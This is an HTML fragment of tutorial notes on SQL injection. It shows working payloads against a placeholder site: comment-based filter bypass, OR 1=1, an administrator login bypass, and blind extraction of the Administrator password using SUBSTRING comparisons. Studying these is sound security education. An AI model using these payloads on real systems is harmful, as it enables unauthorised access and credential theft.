                <p class = "green">Retrieving Hidden Data:</p>
                <p class = "blue">https://insecure-website.com/products?category=Gifts'--</p>
                <p class = "blue">Using this causes: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1</p>
                <p>Crucially, note that -- is a comment indicator in SQL. This means that the   rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes AND released = 1. As a result, all products are displayed, including those that are not yet released.</p>
                <p class = "blue">https://insecure-website.com/products?category=Gifts'+OR+1=1--</p>
                <p class = "blue">Using this causes:
                    SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
                    </p>
                <p>The modified query returns all items where either the category is Gifts, or 1 is equal to 1. As 1=1 is always true, the query returns all items.</p>
                <h3 class = "warning">WARNING!</h3>
                <p class = "blue">Take care when injecting the condition OR 1=1 into a SQL  query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.</p>
                <p>Subverting Application Logic:</p>
                <p class = "blue">SELECT * FROM users WHERE username = 'administrator'--' AND  password = ''
                </p>
                <p>In this case, an attacker can log in as any user without the need for a  password. They can do this using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. </p>
                <p>Blind SQL Injection:</p>
                <p class = "blue">xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
                <p class = "blue">TRUE</p>
                <p class = "green">we know the first character of the password is more than "m"</p>
                <p class = "blue">AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't</p>
                <p class = "blue">FALSE</p>
                <p class = "green">Now we know the first character of the password is less than "t"</p>
                <p class = "blue">xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</p>
                <p class = "blue">TRUE</p>
                <p class = "green">Therefore we know the first character is "s"</p>
                <p class = "green">We can continue this process to systematically determine the full password for the Administrator user.</p>
